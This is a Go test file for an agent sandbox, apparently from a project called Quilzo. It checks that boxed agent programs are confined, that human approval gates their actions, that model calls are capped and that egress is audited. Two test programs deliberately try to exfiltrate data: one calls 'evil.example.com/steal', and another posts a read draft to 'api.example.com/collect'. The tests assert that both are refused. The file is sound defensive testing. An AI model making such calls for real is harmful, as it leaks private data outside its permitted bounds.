// SPDX-FileCopyrightText: 2026 Rashik Adhikari
// SPDX-License-Identifier: AGPL-3.0-or-later OR LicenseRef-Quilzo-Commercial

package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/quilzo/quilzo/internal/agent"
	"github.com/quilzo/quilzo/internal/agentbox"
	"github.com/quilzo/quilzo/internal/audit"
	"github.com/quilzo/quilzo/internal/auth"
)

// programAgentMain is the program in the box: an agent written by somebody
// else, speaking MCP to the run's interface and OpenAI's shape to the
// model, and trying a host it was never given.
func programAgentMain() {
	url, tok := os.Getenv("QUILZO_MCP_URL"), os.Getenv("QUILZO_RUN_TOKEN")
	client := http.Client{Timeout: 10 * time.Second}
	call := func(id int, tool, op string) string {
		body, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": id, "method": "tools/call",
			"params": map[string]any{"name": tool, "arguments": map[string]any{"operation": op},
				"_meta": map[string]any{"io.modelcontextprotocol/protocolVersion": "2026-07-28"}}})
		req, _ := http.NewRequest("POST", url, bytes.NewReader(body))
		req.Header.Set("Authorization", "Bearer "+tok)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Accept", "application/json, text/event-stream")
		req.Header.Set("MCP-Protocol-Version", "2026-07-28")
		req.Header.Set("Mcp-Method", "tools/call")
		req.Header.Set("Mcp-Name", tool)
		res, err := client.Do(req)
		if err != nil {
			return "error: " + err.Error()
		}
		b, _ := io.ReadAll(res.Body)
		var r struct {
			Result struct {
				Content []struct{ Text string } `json:"content"`
			} `json:"result"`
			Error *struct{ Message string } `json:"error"`
		}
		_ = json.Unmarshal(b, &r)
		if r.Error != nil {
			return "refused: " + r.Error.Message
		}
		if len(r.Result.Content) > 0 {
			return r.Result.Content[0].Text
		}
		return fmt.Sprintf("status %d: %s", res.StatusCode, b)
	}
	listed := call(1, "quilzo_read", "list_pages")
	published := call(2, "quilzo_write", "publish")
	asked := call(3, "quilzo_read", "read_page")
	mreq, _ := http.NewRequest("POST", os.Getenv("OPENAI_BASE_URL")+"/chat/completions",
		strings.NewReader(`{"model":"x","messages":[{"role":"user","content":"hello"}]}`))
	mreq.Header.Set("Authorization", "Bearer "+tok)
	model := 0
	if res, err := client.Do(mreq); err == nil {
		model = res.StatusCode
	}
	away := 0
	if res, err := client.Get("http://evil.example.com/steal"); err == nil {
		away = res.StatusCode
	}
	fmt.Printf("listed=%t publish=%q asked=%q model=%d away=%d\n",
		strings.Contains(listed, "about") || strings.Contains(listed, "index"), published, asked, model, away)
}

// programLeakMain reads a page of the draft through its run, then tries to
// send it to a host its manifest does name.
func programLeakMain() {
	url, tok := os.Getenv("QUILZO_MCP_URL"), os.Getenv("QUILZO_RUN_TOKEN")
	body := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"quilzo_read","arguments":{"operation":"read_page","arguments":{"page":"about"}},"_meta":{"io.modelcontextprotocol/protocolVersion":"2026-07-28"}}}`
	req, _ := http.NewRequest("POST", url, strings.NewReader(body))
	for k, v := range map[string]string{"Authorization": "Bearer " + tok, "Content-Type": "application/json",
		"Accept": "application/json, text/event-stream", "MCP-Protocol-Version": "2026-07-28",
		"Mcp-Method": "tools/call", "Mcp-Name": "quilzo_read"} {
		req.Header.Set(k, v)
	}
	read := 0
	if res, err := http.DefaultClient.Do(req); err == nil {
		read = res.StatusCode
	}
	sent := 0
	if res, err := http.Post("http://api.example.com/collect", "text/plain", strings.NewReader("the draft")); err == nil {
		sent = res.StatusCode
	}
	fmt.Printf("read=%d sent=%d\n", read, sent)
}

func programAgent(t *testing.T) string {
	t.Helper()
	root, _ := identityStore(t)
	n := agentbox.Native{Exe: os.Args[0], Init: []string{"agentbox-init"}, Shim: []string{"agentbox-shim"}}
	if a := n.Check(); !a.OK {
		t.Skip("no box here: " + a.Why)
	}
	testBackend = n
	t.Cleanup(func() { testBackend = nil })
	m := agent.Manifest{Name: "coder", Kind: agent.KindTask, Purpose: "work on the pages",
		Capabilities: []string{"list_pages", "read_page"}, Autonomy: agent.AutonomyDraft,
		Retrieval: agent.Retrieval{Ref: "draft"}, AskFirst: []string{"read_page"},
		Tools:   []agent.Tool{{Name: "lookup", Host: "api.example.com", Purpose: "look things up"}},
		Budget:  agent.Budget{Steps: 10, Tools: 2, Duration: agent.Duration(time.Minute)},
		Program: &agent.Program{Command: []string{os.Args[0], "agentbox-program"}}}
	if err := declareAgent(root, m, true, asAdmin("dana")); err != nil {
		t.Fatal(err)
	}
	return root
}

// answerWhenAsked waits for a program's run to ask a person, and answers it
// the way the run's page does.
func answerWhenAsked(t *testing.T, root string, approve bool, by string) chan error {
	return answerAgentWhenAsked(t, root, "coder", approve, by)
}

func answerAgentWhenAsked(t *testing.T, root, name string, approve bool, by string) chan error {
	t.Helper()
	done := make(chan error, 1)
	go func() {
		deadline := time.Now().Add(30 * time.Second)
		for time.Now().Before(deadline) {
			recs, _ := listAgentRuns(root, name, 0)
			for _, r := range recs {
				if w := r.Trace.Waiting; w != nil && w.Live {
					_, err := continueAgentRun(context.Background(), root, r.ID,
						&agent.Verdict{N: w.N, Approve: approve}, asAdmin(by))
					done <- err
					return
				}
			}
			time.Sleep(50 * time.Millisecond)
		}
		done <- fmt.Errorf("the run never asked")
	}()
	return done
}

func TestAnAgentsProgramDecidesInItsBoxThroughTheRunsGate(t *testing.T) {
	root := programAgent(t)
	answered := answerWhenAsked(t, root, false, "lee")
	id, out, err := runAgentKeptBy(context.Background(), root, "coder", "list the pages", false, true, asAdmin("dana"))
	if aerr := <-answered; aerr != nil {
		t.Fatalf("answering: %v", aerr)
	}
	if err != nil {
		t.Fatalf("%v\n%s", err, out.ProgramErr)
	}
	tr := out.Trace
	if !tr.Complete || !strings.Contains(tr.Answer, "listed=true") {
		t.Fatalf("answer %q stopped %q\n%s", tr.Answer, tr.Stopped, out.ProgramErr)
	}
	// The refusals came back to the program as refusals.
	for _, want := range []string{`publish="refused:`, `asked="refused:`, "lee declined this", "model=429", "away=403"} {
		if !strings.Contains(tr.Answer, want) {
			t.Errorf("the program saw %q, not %s", tr.Answer, want)
		}
	}
	c := out.Program.Confined
	if !c.Namespaces || !c.Seccomp || !c.Capabilities || !c.Files || !c.Ports {
		t.Errorf("confinement %+v", c)
	}
	decided := false
	for _, src := range out.Receipt.Sources {
		decided = decided || src.Kind == agent.FromProgram
	}
	if !decided {
		t.Errorf("the receipt does not say a program decided: %+v", out.Receipt.Sources)
	}
	if !tr.Tainted || out.Model != "program:"+strings.TrimPrefix(os.Args[0][strings.LastIndex(os.Args[0], "/")+1:], "") {
		t.Errorf("tainted %v, decided by %q", tr.Tainted, out.Model)
	}
	// Three steps, in the run's own record, two of them refused: the one
	// that asks first waited for a person, who declined it.
	if len(tr.Steps) != 4 || !tr.Steps[0].Allowed || tr.Steps[1].Allowed || tr.Steps[2].Allowed ||
		!strings.Contains(tr.Steps[2].Why, "lee declined this") || !tr.Steps[3].Action.Done() {
		t.Fatalf("steps %+v", tr.Steps)
	}
	evs, _ := audit.Read(auditPath(root))
	var actions, program, egress, declined int
	for _, e := range evs {
		if e.Detail["run"] != id {
			continue
		}
		switch e.Action {
		case "agent.action":
			actions++
			if e.Principal == "" || e.Kind != audit.KindAI || !strings.HasPrefix(e.Model, "program:") {
				t.Errorf("an action recorded as %s %s %s", e.Principal, e.Kind, e.Model)
			}
		case "agent.program":
			program++
			if e.Detail["seccomp"] != "true" || e.Detail["backend"] != "native" {
				t.Errorf("program record %v", e.Detail)
			}
		case "agent.decline":
			declined++
		case "agent.egress":
			egress++
			if e.Outcome != audit.Denied || e.Detail["host"] != "evil.example.com" {
				t.Errorf("egress record %v %v", e.Outcome, e.Detail)
			}
		}
	}
	if actions != 4 || program != 1 || egress != 1 || declined != 1 {
		t.Fatalf("%d action records, %d program, %d egress, %d declined", actions, program, egress, declined)
	}
	// And the receipt holds all of it.
	rf, err := buildReceipt(root, id, time.Now())
	if err != nil {
		t.Fatal(err)
	}
	kinds := map[string]int{}
	for _, e := range rf.Entries {
		kinds[e.Entry.Action]++
	}
	if kinds["agent.egress"] != 1 || kinds["agent.program"] != 1 || kinds["agent.run"] != 1 {
		t.Fatalf("the receipt holds %v", kinds)
	}
	if c := checkReceipt(rf, nil); len(c.Problems) != 0 {
		t.Fatalf("%+v", c.Problems)
	}
}

// What asks first waits for a person while the program waits on the call,
// and an approval does exactly that action and answers the program.
func TestAProgramWaitsForAPersonAndAnApprovalAnswersIt(t *testing.T) {
	root := programAgent(t)
	answered := answerWhenAsked(t, root, true, "lee")
	id, out, err := runAgentKeptBy(context.Background(), root, "coder", "list the pages", false, true, asAdmin("dana"))
	if aerr := <-answered; aerr != nil {
		t.Fatalf("answering: %v", aerr)
	}
	if err != nil {
		t.Fatalf("%v\n%s", err, out.ProgramErr)
	}
	tr := out.Trace
	// Done, and answered by the read itself: the program names no page.
	if !tr.Steps[2].Allowed || tr.Steps[2].Action.Op != "read_page" ||
		!strings.Contains(tr.Answer, "no page was named") || strings.Contains(tr.Answer, "declined") {
		t.Fatalf("the approved read was not done: %q %+v", tr.Answer, tr.Steps)
	}
	rec, err := loadAgentRun(root, id)
	if err != nil {
		t.Fatal(err)
	}
	if len(rec.Answers) != 1 || !rec.Answers[0].Approve || rec.Answers[0].By != "lee" || rec.Trace.Waiting != nil {
		t.Errorf("the record keeps answers %+v, waiting %+v", rec.Answers, rec.Trace.Waiting)
	}
	// An answer to a run that has ended is refused: nothing would act on it.
	if _, err := continueAgentRun(context.Background(), root, id, &agent.Verdict{N: 3, Approve: true}, asAdmin("lee")); err == nil {
		t.Error("a finished run took an answer")
	}
}

func TestAProgramRunIsAskedForAndDeclared(t *testing.T) {
	root := programAgent(t)
	if _, _, err := runAgentKeptBy(context.Background(), root, "tidy", "x", false, true, asAdmin("dana")); err == nil ||
		!strings.Contains(err.Error(), "declares no program") {
		t.Fatalf("a program run of an agent with none: %v", err)
	}
	if _, _, err := runAgentKeptBy(context.Background(), root, "coder", "x", true, true, asAdmin("dana")); err == nil ||
		!strings.Contains(err.Error(), "not both") {
		t.Fatalf("model and program at once: %v", err)
	}
	// Without --program, a program agent walks its manifest like any other.
	_, out, err := runAgentKeptBy(context.Background(), root, "coder", "x", false, false, asAdmin("dana"))
	if err != nil || out.Model != "" || out.Program.Confined.Backend != "" {
		t.Fatalf("a walk ran the program: %v %q", err, out.Model)
	}
}

// A program is never given the store, however its paths are spelt.
func TestAProgramIsNeverGivenTheStore(t *testing.T) {
	root := t.TempDir()
	link := filepath.Join(t.TempDir(), "looks-innocent")
	if err := os.Symlink(root, link); err != nil {
		t.Fatal(err)
	}
	for name, p := range map[string]*agent.Program{
		"the store":         {Command: []string{"/usr/bin/x"}, Read: []string{root}},
		"inside it":         {Command: []string{"/usr/bin/x"}, Read: []string{filepath.Join(root, "tokens.json")}},
		"around it":         {Command: []string{"/usr/bin/x"}, Read: []string{filepath.Dir(root)}},
		"a link to it":      {Command: []string{"/usr/bin/x"}, Read: []string{link}},
		"its program there": {Command: []string{filepath.Join(root, "agent")}},
	} {
		if err := clearOfStore(root, p); err == nil {
			t.Errorf("%s: allowed", name)
		}
	}
	if err := clearOfStore(root, &agent.Program{Command: []string{"/usr/bin/x"}, Read: []string{"/opt/agent"}}); err != nil {
		t.Fatalf("a program elsewhere: %v", err)
	}
}

// Whoever may change an agent's declaration may not give it a program
// unless they are an administrator, on any path.
func TestOnlyAnAdministratorGivesAnAgentAProgram(t *testing.T) {
	root, pol := identityStore(t)
	if err := pol.Grant(auth.Binding{Principal: "ann", Role: auth.RolePublisher, Resource: "/"}); err != nil {
		t.Fatal(err)
	}
	if err := saveJSON(policyPath(root), pol); err != nil {
		t.Fatal(err)
	}
	set, _ := loadAgents(root)
	m := set.Agents["tidy"]
	m.Program = &agent.Program{Command: []string{"/usr/bin/env"}}
	ann := human("ann")
	ann.Role, ann.Verified = auth.RolePublisher, true
	if err := declareAgent(root, m, false, ann); err == nil || !strings.Contains(err.Error(), "administrator") {
		t.Fatalf("a publisher gave an agent a program: %v", err)
	}
	if err := declareAgent(root, m, false, asAdmin("dana")); err != nil {
		t.Fatalf("an administrator: %v", err)
	}
	// Unchanged, it is not asked again: a publisher editing the rest of the
	// declaration keeps the program an administrator set.
	m.Purpose = "Tidy pages, carefully"
	if err := declareAgent(root, m, false, ann); err != nil {
		t.Fatalf("an unchanged program was asked about: %v", err)
	}
	m.Program = &agent.Program{Command: []string{"/usr/bin/env"}, Read: []string{root}}
	if err := declareAgent(root, m, false, asAdmin("dana")); err == nil {
		t.Fatal("a program reading the store was declared")
	}
}

func TestAProgramsModelCallsMeetTheRunsCaps(t *testing.T) {
	m := agent.Manifest{Name: "coder", Budget: agent.Budget{Steps: 5, Tools: 1, Duration: agent.Duration(time.Minute),
		Tokens: 100, Money: "0.01"}}
	s := agent.NewSession(m, nil)
	if err := runModelGate(m, s); err != nil {
		t.Fatal(err)
	}
	s.Tokens(100)
	if err := runModelGate(m, s); err == nil || !strings.Contains(err.Error(), "tokens") {
		t.Fatalf("over its tokens: %v", err)
	}
	s2 := agent.NewSession(m, nil)
	s2.Charge(10_000)
	if err := runModelGate(m, s2); err == nil || !strings.Contains(err.Error(), "money") {
		t.Fatalf("over its money: %v", err)
	}
}

// A program that has read the draft sends it nowhere, not even to a host
// its manifest names: it cannot be held for a person, so the connection is
// refused with the reason.
func TestAProgramThatReadTheDraftCannotSendItOut(t *testing.T) {
	root := programAgent(t)
	set, _ := loadAgents(root)
	m := set.Agents["coder"]
	m.AskFirst = nil
	m.Program.Command = []string{os.Args[0], "agentbox-program-leak"}
	if err := declareAgent(root, m, false, asAdmin("dana")); err != nil {
		t.Fatal(err)
	}
	id, out, err := runAgentKeptBy(context.Background(), root, "coder", "send the about page", false, true, asAdmin("dana"))
	if err != nil {
		t.Fatalf("%v\n%s", err, out.ProgramErr)
	}
	if !strings.Contains(out.Trace.Answer, "read=200 sent=403") {
		t.Fatalf("the program saw %q\n%s", out.Trace.Answer, out.ProgramErr)
	}
	evs, _ := audit.Read(auditPath(root))
	found := false
	for _, e := range evs {
		if e.Action == "agent.egress" && e.Detail["run"] == id {
			found = e.Outcome == audit.Denied && e.Detail["host"] == "api.example.com" &&
				strings.Contains(e.Detail["why"], "not published")
		}
	}
	if !found {
		t.Fatal("the refused connection is not recorded with the breaker's reason")
	}
}
